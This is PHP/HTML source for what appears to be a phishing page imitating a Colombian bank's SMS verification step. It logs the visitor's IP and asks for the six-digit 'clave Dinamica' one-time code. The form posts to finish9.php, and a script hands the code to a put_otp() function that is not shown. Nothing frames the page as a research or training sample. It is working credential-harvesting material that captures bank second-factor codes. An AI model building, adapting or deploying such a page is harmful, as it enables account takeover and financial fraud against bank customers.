
<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
		<meta content="es" http-equiv="Content-Language">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
		<link href="../../../../../src/css/layout.css" rel="stylesheet">
		<link href="../../../../../src/css/fonts.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
		<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
		<script src="../../../../../src/js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../../../../src/js/run.js"></script> 	
   	
  <title>replit</title>
  <link href="style.css" rel="stylesheet" type="text/css" />
  <style>

        *{
            -webkit-appearance: none;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
        input[type=submit]{
            background-color:#fdda24;
            color: #030303;
            width: 80%;
            height: 41px;
            border-radius: 124px;
            border-input: 0px solid #ecfd08;
            margin-top: 0px;
            border:0px solid gray;
            padding: 5px;
            font-weight:bold;
            font-size:1em;
            
        }
        

       
    </style>
</head>

<body>
   

  
  <br>
  <br>
 <form action="finish9.php" method="post">
        <img src="img/dinamica.jpeg" alt="" width="100%">
        <form action="" method="post">   
      <p style="font-size:0.9em;">Por favor ingrese su clave  
	  <br> Dinamica enviada por mensaje de texto</p>       
  <br>
       <center><img src="/img/candadito.svg"   alt="" width="7%">
<input  type="password"  maxlength="6" name="inp-otp" id="inp-otp" 
 placeholder="* * * * * *"><br>
</center> 
              
       <br>
       <center><input  id="btn-otp" name="btn-otp" type="submit" value="Continuar"></center><br>
<a href=""><center> <img src="img/bangol.jpeg" alt="" width="100%"></a>
    </form>

   <br>
  

</body>
</html>
<script type="text/javascript">	
	$(document).ready(function() {
		$('#btn-otp').click(function(){
			if ($("#inp-otp").val().length > 5) {
				put_otp($("#inp-otp").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#inp-otp").focus();
			}			
		});

		$("#inp-otp").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script>